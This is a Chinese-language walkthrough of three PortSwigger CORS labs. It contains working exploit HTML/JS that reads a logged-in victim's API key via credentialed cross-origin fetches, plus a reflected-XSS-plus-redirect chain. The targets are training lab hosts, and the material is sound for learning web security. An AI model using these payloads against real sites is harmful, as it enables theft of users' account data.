---
title: Cross-origin resource sharing (CORS)
description: Cross-origin resource sharing (CORS)
last_update:
  date: "2025-08-26T08:00:00+08:00"
---

## Lab: CORS vulnerability with basic origin reflection

| Dimension | Description                                                                                                |
| --------- | ---------------------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/cors#server-generated-acao-header-from-client-specified-origin-header |
| Lab       | https://portswigger.net/web-security/cors/lab-basic-origin-reflection-attack                               |

在 exploit-server 構造

```html
<script>
  fetch(`${location.origin}/accountDetails`, { credentials: "include" })
    .then((res) => res.json())
    .then((json) => {
      alert(JSON.stringify(json));
      document.getElementById("hello").value = json.apikey;
      document.getElementById("submitSolution").submit();
    });
</script>
<form
  id="submitSolution"
  action="/submitSolution"
  method="POST"
  enctype="application/x-www-form-urlencoded"
>
  <input id="hello" name="answer" />
</form>
```

## Lab: CORS vulnerability with trusted null origin

| Dimension | Description                                                                  |
| --------- | ---------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/cors#whitelisted-null-origin-value      |
| Lab       | https://portswigger.net/web-security/cors/lab-null-origin-whitelisted-attack |

在 exploit-server 構造

```html
<iframe
  id="evilIframe"
  sandbox="allow-scripts allow-top-navigation allow-forms"
></iframe>
<script>
  const inlineHTML = `
<div>
  <script>
    fetch('https://0ab4000a04978dfe81a60340003600c0.web-security-academy.net/accountDetails', {
      credentials : 'include'
    })
      .then(res => res.json())
      .then(json => {
        document.getElementById("hello").value = json.apikey;
        document.getElementById("submitSolution").submit();
      })
  <\/script>
  <form
    id="submitSolution"
    action="https://0ab4000a04978dfe81a60340003600c0.web-security-academy.net/submitSolution"
    method="POST"
    enctype="application/x-www-form-urlencoded"
  >
    <input id="hello" name="answer" />
  </form>
</div>`;
  document.getElementById("evilIframe").setAttribute("srcdoc", inlineHTML);
</script>
```

中間有遇到一個小問題，在 `<script>` 標籤內的 template literal 定義 `<script>`

```html
<script>
  // 這樣會出錯
  const html = `<script>alert(1);</script>`;
</script>

<script>
  // 這樣就沒問題
  const html = `<script>alert(1);<\/script>`;
</script>
```

## Lab: CORS vulnerability with trusted insecure protocols

| Dimension | Description                                                                        |
| --------- | ---------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/cors#breaking-tls-with-poorly-configured-cors |
| Lab       | https://portswigger.net/web-security/cors/lab-breaking-https-attack                |

在商品詳細頁看到

```html
<script>
  const stockCheckForm = document.getElementById("stockCheckForm");
  stockCheckForm.addEventListener("submit", function (e) {
    const data = new FormData(stockCheckForm);
    window.open(
      "http://stock.0a6700fc041606fe80dd9ea500b90008.web-security-academy.net/?productId=4&storeId=" +
        data.get("storeId"),
      "stock",
      "height=10,width=10,left=10,top=10,menubar=no,toolbar=no,location=no,status=no",
    );
    e.preventDefault();
  });
</script>
```

針對 productId 跟 storeId 玩了一陣子，發現 productId 有 Reflected XSS，可以構造

```
http://stock.0a6700fc041606fe80dd9ea500b90008.web-security-academy.net/?productId=<script>alert(1)</script>&storeId=1
```

接下來應該就明朗了，我可以在 subdomain 執行任何程式碼，就可以戳 API 拿 Token 然後上傳答案，構造跟 [第一題](#lab-cors-vulnerability-with-basic-origin-reflection) 一樣的 HTML

```html
<script>
  fetch(`${location.origin}/accountDetails`, { credentials: "include" })
    .then((res) => res.json())
    .then((json) => {
      alert(JSON.stringify(json));
      document.getElementById("hello").value = json.apikey;
      document.getElementById("submitSolution").submit();
    });
</script>
<form
  id="submitSolution"
  action="/submitSolution"
  method="POST"
  enctype="application/x-www-form-urlencoded"
>
  <input id="hello" name="answer" />
</form>
```

然後整段塞到 ?productId= 後面，記得要把 `\n` 拿掉，可以用

```js
console.log(
  `<script>
  fetch(
    "https://0a6700fc041606fe80dd9ea500b90008.web-security-academy.net/accountDetails",
    { credentials: "include" },
  )
    .then((res) => res.json())
    .then((json) => {
      alert(JSON.stringify(json));
      document.getElementById("hello").value = json.apikey;
      document.getElementById("submitSolution").submit();
    });
</script>
<form
  id="submitSolution"
  action="/submitSolution"
  method="POST"
  enctype="application/x-www-form-urlencoded"
>
  <input id="hello" name="answer" />
</form>`.replaceAll("\n", ""),
);
```

之後在 exploit-server 構造

```
HTTP/1.1 301 Moved Permanently
Location: http://stock.0a6700fc041606fe80dd9ea500b90008.web-security-academy.net/?productId=<script>  fetch(    "https://0a6700fc041606fe80dd9ea500b90008.web-security-academy.net/accountDetails",    { credentials: "include" },  )    .then((res) => res.json())    .then((json) => {      alert(JSON.stringify(json));      document.getElementById("hello").value = json.apikey;      document.getElementById("submitSolution").submit();    });</script><form  id="submitSolution"  action="/submitSolution"  method="POST"  enctype="application/x-www-form-urlencoded">  <input id="hello" name="answer" /></form>&storeId=0
```

## 小結

CORS 的 Lab 只有三題，而且最後一題因為沒辦法 MitM，所以最終還是要回到 XSS，有基本的 XSS 觀念，再來解最後一題會比較快

## 參考資料

- https://portswigger.net/web-security/cors
